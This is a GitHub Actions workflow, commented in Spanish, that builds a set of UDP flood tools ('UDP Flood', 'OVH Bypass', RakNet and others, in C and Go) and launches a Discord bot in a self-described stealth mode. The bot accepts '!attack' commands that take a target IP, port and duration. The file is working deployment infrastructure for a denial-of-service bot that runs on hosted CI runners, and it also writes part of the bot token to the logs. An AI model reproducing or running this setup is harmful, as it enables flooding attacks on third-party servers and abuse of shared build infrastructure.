name: PitoBotAuto

on:
  workflow_dispatch:
    inputs:
      discord_token:
        description: 'Token del bot de Discord'
        required: true
        type: string
        default: ''
  push:
    branches: [main]

jobs:
  deploy-all-methods:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    
    steps:
    - name: üì• Clonar repositorio
      uses: actions/checkout@v4
      with:
        fetch-depth: 1

    - name: üìÅ Configurar directorio de trabajo
      run: |
        if [ -d "BotUDPs" ]; then
          cd BotUDPs
          echo "Directorio: BotUDPs/"
        fi
        echo "Ubicaci√≥n actual: $(pwd)"
        echo "Archivos disponibles:"
        ls -la

    - name: üêç Configurar Python 3.11
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
        cache: 'pip'

    - name: ü¶æ Configurar Go 1.21
      uses: actions/setup-go@v4
      with:
        go-version: '1.21'
        cache: true

    - name: üîß Instalar dependencias del sistema
      run: |
        sudo apt-get update
        sudo apt-get install -y build-essential gcc g++ make libpcap-dev
        echo "‚úÖ Herramientas instaladas"

    - name: üì¶ Instalar dependencias Python
      run: |
        python -m pip install --upgrade pip
        pip install discord.py
        echo "‚úÖ Discord.py instalado"

    - name: üìö Configurar m√≥dulos Go
      run: |
        echo "Configurando Go modules..."
        # Crear go.mod si no existe
        if [ ! -f "go.mod" ]; then
          go mod init bot-udps 2>/dev/null || true
        fi
        
        # Instalar dependencias necesarias para raknet.go
        go get github.com/sandertv/go-raknet 2>/dev/null || echo "‚ö†  go-raknet"
        go get github.com/sirupsen/logrus 2>/dev/null || echo "‚ö†  logrus"
        
        echo "‚úÖ Dependencias Go configuradas"

    - name: üõ†Ô∏è Compilar TODOS los binarios C
      run: |
        echo "========================================"
        echo "COMPILANDO TODOS LOS BINARIOS C"
        echo "========================================"
        
        # Lista completa de m√©todos C
        declare -A c_methods=(
          ["udp.c"]="UDP Flood"
          ["udphex.c"]="UDPHEX" 
          ["udppps.c"]="UDPPPS"
          ["ovh.c"]="OVH Bypass"
          ["udppayload.c"]="UDP Payload"
        )
        
        compiled_count=0
        failed_count=0
        
        for source_file in "${!c_methods[@]}"; do
          if [ -f "$source_file" ]; then
            binary="${source_file%.c}"
            method_name="${c_methods[$source_file]}"
            
            echo -n "üî® Compilando $source_file ($method_name)... "
            
            # Comando de compilaci√≥n espec√≠fico para cada m√©todo
            case $source_file in
              "ovh.c")
                gcc -O3 -pthread "$source_file" -o "$binary" -lpcap 2>/dev/null
                ;;
              *)
                gcc -O3 -pthread "$source_file" -o "$binary" 2>/dev/null
                ;;
            esac
            
            if [ -f "$binary" ]; then
              chmod +x "$binary"
              echo "‚úÖ $binary"
              ((compiled_count++))
            else
              echo "‚ùå Fall√≥"
              ((failed_count++))
            fi
          else
            echo "‚ùì $source_file no encontrado"
            ((failed_count++))
          fi
        done
        
        echo "========================================"
        echo "RESULTADO: $compiled_count compilados, $failed_count fallos"
        echo "========================================"

    - name: üîç Verificar scripts Go
      run: |
        echo "========================================"
        echo "VERIFICANDO SCRIPTS GO"
        echo "========================================"
        
        go_scripts=("udpflood.go" "raknet.go")
        
        for script in "${go_scripts[@]}"; do
          if [ -f "$script" ]; then
            echo "‚úÖ $script disponible"
            
            # Probar compilaci√≥n r√°pida
            if go build -o /tmp/test "$script" 2>/dev/null; then
              echo "   ‚úì Compila correctamente"
              rm -f /tmp/test
            else
              echo "   ‚ö†  Posibles errores de compilaci√≥n"
            fi
          else
            echo "‚ùå $script NO ENCONTRADO"
          fi
        done
        
        echo "========================================"

    - name: üîê Configurar token autom√°ticamente
      env:
        # Prioridad: input manual > secret > variable de entorno
        MANUAL_TOKEN: ${{ github.event.inputs.discord_token }}
        SECRET_TOKEN: ${{ secrets.DISCORD_BOT_TOKEN }}
        ENV_TOKEN: ${{ vars.DISCORD_TOKEN }}
      run: |
        echo "üîê CONFIGURANDO TOKEN DEL BOT"
        echo "========================================"
        
        # Determinar qu√© token usar
        if [ -n "$MANUAL_TOKEN" ] && [ "$MANUAL_TOKEN" != "" ]; then
          echo "‚úì Usando token del input manual"
          SELECTED_TOKEN="$MANUAL_TOKEN"
        elif [ -n "$SECRET_TOKEN" ] && [ "$SECRET_TOKEN" != "" ]; then
          echo "‚úì Usando token del secret"
          SELECTED_TOKEN="$SECRET_TOKEN"
        elif [ -n "$ENV_TOKEN" ] && [ "$ENV_TOKEN" != "" ]; then
          echo "‚úì Usando token de variable de entorno"
          SELECTED_TOKEN="$ENV_TOKEN"
        else
          echo "‚ùå ERROR: No se encontr√≥ ning√∫n token v√°lido"
          echo ""
          echo "SOLUCI√ìN: Proporciona un token de una de estas formas:"
          echo "1. Al ejecutar manualmente el workflow, ingr√©salo en el campo 'discord_token'"
          echo "2. Configura un secret llamado 'DISCORD_BOT_TOKEN' en Settings ‚Üí Secrets"
          echo "3. Configura una variable llamada 'DISCORD_TOKEN' en Settings ‚Üí Variables"
          exit 1
        fi
        
        # Validar formato b√°sico del token
        if [ ${#SELECTED_TOKEN} -lt 50 ]; then
          echo "‚ùå ERROR: Token demasiado corto (${#SELECTED_TOKEN} caracteres)"
          echo "Un token v√°lido de Discord tiene ~59 caracteres"
          exit 1
        fi
        
        # Crear token.txt
        echo "$SELECTED_TOKEN" > token.txt
        
        # Verificar creaci√≥n
        if [ -f "token.txt" ]; then
          TOKEN_LENGTH=$(wc -c < token.txt | tr -d ' ')
          TOKEN_PREVIEW=$(head -c 15 token.txt)
          echo "‚úÖ token.txt creado correctamente"
          echo "   Tama√±o: $TOKEN_LENGTH caracteres"
          echo "   Vista previa: ${TOKEN_PREVIEW}..."
          echo "   Permisos: $(ls -la token.txt | cut -d' ' -f1)"
        else
          echo "‚ùå ERROR: No se pudo crear token.txt"
          exit 1
        fi
        
        echo "========================================"

    - name: üß™ Verificar estructura completa
      run: |
        echo "========================================"
        echo "VERIFICACI√ìN FINAL DE ESTRUCTURA"
        echo "========================================"
        
        echo "üìÅ Directorio actual: $(pwd)"
        echo ""
        
        echo "üìÑ Archivos Python:"
        ls -la *.py 2>/dev/null || echo "   No hay archivos .py"
        echo ""
        
        echo "‚öôÔ∏è  Binarios C compilados:"
        find . -maxdepth 1 -type f -executable -name "*" ! -name "*.py" ! -name "*.go" ! -name "*.txt" ! -name "*.sh" | while read bin; do
          echo "   ‚úì $(basename "$bin")"
        done
        echo ""
        
        echo "ü¶æ Scripts Go:"
        ls -la *.go 2>/dev/null || echo "   No hay archivos .go"
        echo ""
        
        echo "üîë Archivos de configuraci√≥n:"
        ls -la token.txt 2>/dev/null || echo "   token.txt no encontrado"
        echo ""
        
        echo "‚úÖ Verificaci√≥n completada"
        echo "========================================"

    - name: üöÄ Ejecutar bot autom√°ticamente (con timeout)
      run: |
        echo "========================================"
        echo "INICIANDO BOT UDP - MODO SIGILOSO"
        echo "========================================"
        echo "üìÖ Hora de inicio: $(date)"
        echo "üêç Python version: $(python3 --version)"
        echo "ü¶æ Go version: $(go version 2>/dev/null || echo 'No disponible')"
        echo "üîá Modo: SIGILOSO (0 mensajes en Discord)"
        echo "========================================"
        echo ""
        echo "üéÆ M√âTODOS DISPONIBLES:"
        echo "   !attack udp [IP] [PUERTO] [TIEMPO]"
        echo "   !attack udphex [IP] [PUERTO] [TIEMPO]"
        echo "   !attack udppps [IP] [PUERTO] [TIEMPO]"
        echo "   !attack ovh [IP] [PUERTO] [TIEMPO]"
        echo "   !attack raknet [IP] [PUERTO] [TIEMPO]"
        echo "   !attack udpflood [IP] [PUERTO] [TIEMPO]"
        echo "   !attack udppayload [IP] [PUERTO] [TIEMPO] [PAYLOAD]"
        echo ""
        echo "üìù El bot solo registrar√° actividad en esta consola"
        echo "   NO enviar√° mensajes a Discord"
        echo "========================================"
        
        # Verificar requisitos m√≠nimos
        if [ ! -f "bot.py" ]; then
          echo "‚ùå ERROR: bot.py no encontrado"
          exit 1
        fi
        
        if [ ! -f "token.txt" ] || [ ! -s "token.txt" ]; then
          echo "‚ùå ERROR: token.txt no existe o est√° vac√≠o"
          exit 1
        fi
        
        echo ""
        echo "‚ö° INICIANDO BOT.PY..."
        echo "   (Ejecuci√≥n por 5 minutos m√°ximo)"
        echo "----------------------------------------"
        
        # Ejecutar bot con timeout
        timeout 300 python3 bot.py
        
        EXIT_CODE=$?
        
        echo ""
        echo "----------------------------------------"
        
        if [ $EXIT_CODE -eq 0 ]; then
          echo "‚úÖ Bot finalizado normalmente"
        elif [ $EXIT_CODE -eq 124 ]; then
          echo "‚è∞ Bot detenido por timeout (5 minutos completados)"
        else
          echo "‚ö†Ô∏è  Bot finalizado con c√≥digo: $EXIT_CODE"
        fi
        
        echo "========================================"

    - name: üìä Reporte final
      if: always()
      run: |
        echo "========================================"
        echo "üìä REPORTE FINAL DEL WORKFLOW"
        echo "========================================"
        echo "Workflow: ${{ github.workflow }}"
        echo "Ejecuci√≥n: ${{ github.run_id }}"
        echo "Estado: ${{ job.status }}"
        echo "Hora inicio: ${{ job.started_at }}"
        echo "Hora fin: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
        echo ""
        echo "üìÅ Archivos generados:"
        ls -la | grep -E "^-" | head -20
        echo ""
        echo "‚úÖ TODOS LOS M√âTODOS CONFIGURADOS:"
        echo "   1. UDP Flood (C)"
        echo "   2. UDPHEX (C)" 
        echo "   3. UDPPPS (C)"
        echo "   4. OVH Bypass (C)"
        echo "   5. RakNet Attack (Go)"
        echo "   6. UDP Flood Go (Go)"
        echo "   7. UDP Payload (C)"
        echo ""
        echo "üîß Bot listo para uso sigiloso"
        echo "========================================"
